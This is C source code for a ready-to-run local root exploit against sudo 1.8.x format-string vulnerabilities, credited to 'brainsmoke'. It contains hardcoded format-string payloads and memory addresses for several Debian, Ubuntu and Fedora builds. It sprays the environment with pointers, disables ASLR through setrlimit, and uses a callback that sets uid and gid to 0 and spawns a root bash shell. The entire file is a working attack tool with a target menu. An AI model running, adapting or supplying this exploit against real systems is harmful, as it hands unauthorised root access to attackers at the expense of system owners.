/*
 * Exploit by brainsmoke
 */

#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/resource.h>

enum { GOT,ASK_PASS };

struct
{
	char *name;
	char *fmt, *testfmt, *pattern;
	int type;
	long len, repeat, align;
	long ptr_size;

}
binaries[] =
{

	{
		.name     = "sudo 1.8.3p1 (Debian Wheezy i386) (GOT)",
		.type     = GOT,
		.fmt      = "%1$134521379c%3503$n%1$6006c%3504$n%1$34548c%3505$n",
		.testfmt  = "%3503$8x|%3504$8x|%3505$8x|AAAAAAAAAAAAAAAAAAAAAAAA",
		.pattern  = "\xbc\x81\x05\x08"
		            "\xf4\x81\x05\x08"
		            "\x80\x9d\x05\x08"
		            "\x4c\x4d\x4e\x4f",
		.len      = 16,
		.repeat   = 1024,
		.align    = 16,
		.ptr_size = 4,
	},
	{
		.name     = "sudo 1.8.3p1 (Debian Wheezy amd64) (GOT)",
		.type     = GOT,
		.fmt      = "%1$4212470c%25001$n%1$25040c%25002$n",
		.testfmt  = "%25001$8x|%25002$8x|AAAAAAAAAAAAAAAA",
		.pattern  = "\xb0\x05\x61\x00\x00\x00\x00\x00"
		            "\x38\x02\x61\x00\x00\x00\x00\x00",
		.len      = 16,
		.repeat   = 2048,
		.align    = 16,
		.ptr_size = 8,
	},
	{
		.name     = "sudo 1.8.3p1 (Ubuntu 12.04 i386) [ FORTIFY_SOURCE=2 ] (GOT)",
		.type     = GOT,
		.fmt      = "%1$134526645c%6001$n%1$2489c%6002$n%2854$d%481$d%1073741824$d",
		.testfmt  = "%6001$8x|%6002$8x|AAAAAAAAAAAAAAAAA%2854$d%481$d%1073741824$d",
		.pattern  = "\xcc\x80\x05\x08"
		            "\x38\x80\x05\x08",
		.len      = 8,
		.repeat   = 8192,
		.align    = 8,
		.ptr_size = 4,
	},
	{
		.name     = "sudo 1.8.1p2 (Fedora 16 i386) [ FORTIFY_SOURCE=2 FULL-RELRO ] (ASK_PASS)",
		.type     = ASK_PASS,
		.fmt      = "%1$65535c%6001$n%2850$d%482$d%1073741824$d",
		.testfmt  = "%6001$8x|AAAAAAA%2850$d%482$d%1073741824$d",
		.pattern  = "\x1e\x46\x01\x40",
		.len      = 4,
		.repeat   = 16384,
		.align    = 4,
		.ptr_size = 4,
	},

	{ .name = NULL },
};

int execvb(char *filename, char **argv,
           char *bindata, unsigned long size,
           unsigned long ptrsize, unsigned long alignment)
{
	unsigned long c, i;

	for (c=0,i=0; i<size; i++)
		if (bindata[i] == '\0')
			c++;

	char **envp = malloc( (c+3) * sizeof(char *) );

	envp[0] = &bindata[0];
	for (c=0,i=0; i<size; i++)
		if (bindata[i] == '\0')
			envp[++c] = &bindata[i+1];

	unsigned long datasize = size + strlen(filename)+2 + ptrsize,
	              padlen = alignment - ( datasize % alignment ),
	              lastsize = &bindata[size] - envp[c];

	char *last = malloc(lastsize+padlen+1);
	memcpy(last, envp[c], lastsize);
	memset(&last[lastsize], 'A', padlen);
	last[lastsize+padlen] = '\0';

	envp[c] = last;
	envp[c+1] = NULL;

	int ret = execve(filename, argv, envp);

	free(envp);
	free(last);

	return ret;
}

void usage(char *prog)
{
	int i;

	fprintf(stderr, "Usage: %s <target> [executable]\n\nTargets:\n\n", prog);

	for (i=0; binaries[i].name; i++)
		fprintf(stderr, " %d) %s\n", i, binaries[i].name);

	fprintf(stderr, "\n");
	exit(EXIT_FAILURE);
}

void callback(void)
{
    setresuid(0,0,0);
    setresgid(0,0,0);
	dup2(1, 5);
	dup2(open("/dev/tty", O_RDONLY), 0);
	dup2(open("/dev/tty", O_RDWR), 1);
	dup2(open("/dev/tty", O_RDWR), 2);
    execl("/bin/bash", "bash", NULL);
}

int main(int argc, char *argv[])
{
	if (argc < 2)
		usage(argc ? argv[0]:"sudex");

	if (argc >= 2 && strcmp(argv[1], "CALLBACK") == 0)
		callback();

	unsigned int target = atoi(argv[1]);
	unsigned int c;
	for (c=0; binaries[c].name; c++);

	if (target >= c)
		usage(argv[0]);

	char *progname = "/usr/bin/sudo";

	if (argc > 2)
		progname = argv[2];

	int len = binaries[target].len;
	char b[ binaries[target].repeat * len ];

	long i;
	for (i=0; i<sizeof(b); i+=len)
		memcpy(&b[i], binaries[target].pattern, len);
	
	char *askpass_argv[] = { binaries[target].fmt, "-D9", "-A", "-p", "CALLBACK", "/bin/bash", NULL };
	char *got_argv[] = { binaries[target].fmt, "-D9", NULL };

	char **new_argv = NULL;

	if (binaries[target].type == ASK_PASS)
	{
		strcpy(b, "SUDO_ASKPASS=");
		strcat(b, argv[0]);
		new_argv = askpass_argv;
	}
	else
		new_argv = got_argv;

	close(2);
	open("/dev/null", O_RDWR);
	/* disable ASLR */
	setrlimit(RLIMIT_STACK, &(struct rlimit){RLIM_INFINITY, RLIM_INFINITY});

	execvb(progname, new_argv, b, sizeof(b), binaries[target].ptr_size,
	       binaries[target].align);
}

